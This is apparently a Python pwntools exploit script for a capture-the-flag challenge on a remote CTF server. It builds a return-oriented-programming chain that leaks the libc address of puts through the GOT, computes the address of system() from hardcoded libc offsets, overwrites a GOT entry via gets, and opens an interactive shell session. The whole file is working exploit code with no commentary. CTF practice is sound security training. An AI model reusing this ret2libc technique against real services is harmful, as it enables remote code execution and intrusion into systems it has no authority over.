from pwn import *

context.arch = 'amd64'

#r = remote('127.0.0.1',8888)
r = remote('csie.ctf.tw',10131)

ret_offset = 'Giby'*10
pop_rdi = 0x4006f3
puts_plt = 0x4004e0
gets_plt = 0x400510
puts_got = 0x601018

puts_off = 0x6f690
sys_off  = 0x45390
sh_off = 0x18cd17       #'/bin/sh offset in libc.so.6

rop1 = flat([ret_offset,pop_rdi,puts_got,puts_plt,pop_rdi,puts_got,gets_plt,pop_rdi,puts_got+8,puts_plt])

r.sendline(rop1)

#handle output
r.recvuntil('boom !\n')
puts_addr = u64(r.recvline().strip().ljust(8,'\0'))
#
libc_addr = puts_addr - puts_off
sys_addr = libc_addr + sys_off

pay = flat([sys_addr])
r.send(pay)
r.interactive()

